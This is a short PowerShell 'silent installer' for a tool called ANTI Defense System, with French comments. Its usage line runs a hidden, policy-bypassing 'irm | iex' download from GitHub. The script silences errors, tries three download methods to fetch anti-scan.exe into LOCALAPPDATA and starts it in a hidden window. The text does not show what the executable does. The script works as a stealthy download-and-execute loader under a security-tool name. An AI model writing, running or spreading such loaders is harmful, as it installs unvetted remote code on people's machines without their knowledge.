# ANTI Defense System - Silent Installer v3.3
# ─────────────────────────────────────────────────────────────────────────────
# Usage standard :
#   powershell -WindowStyle Hidden -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/AdamZoda/ANTI/main/install.ps1 | iex"
# ─────────────────────────────────────────────────────────────────────────────

$ErrorActionPreference = "SilentlyContinue"

$REPO_URL   = "https://raw.githubusercontent.com/AdamZoda/ANTI/main/dist"
$installDir = "$env:LOCALAPPDATA\AntiScan"
$exePath    = "$installDir\anti-scan.exe"

# ─── Nettoyage et creation du répertoire ─────────────────────────────────────
Remove-Item -Path $installDir -Recurse -Force -ErrorAction SilentlyContinue
$null = New-Item -ItemType Directory -Force -Path $installDir

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$downloaded = $false

# ─── Telechargement simple ───────────────────────────────────────────────────
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ANTI-Scanner/3.3"
    $wc.DownloadFile("$REPO_URL/anti-scan.exe", $exePath)
    if ((Test-Path $exePath) -and (Get-Item $exePath).Length -gt 1000000) { $downloaded = $true }
} catch {}

if (-not $downloaded) {
    try {
        Invoke-WebRequest -Uri "$REPO_URL/anti-scan.exe" -OutFile $exePath -UseBasicParsing -ErrorAction Stop
        if ((Test-Path $exePath) -and (Get-Item $exePath).Length -gt 1000000) { $downloaded = $true }
    } catch {}
}

if (-not $downloaded) {
    try {
        Import-Module BitsTransfer -ErrorAction Stop
        Start-BitsTransfer -Source "$REPO_URL/anti-scan.exe" -Destination $exePath -ErrorAction Stop
        if ((Test-Path $exePath) -and (Get-Item $exePath).Length -gt 1000000) { $downloaded = $true }
    } catch {}
}

if (-not $downloaded) { exit 1 }

# ─── Lancement direct en arriere-plan (sans Wait bloquant la console parente) ───
try {
    Start-Process -FilePath $exePath -WindowStyle Hidden
} catch {}

exit 0
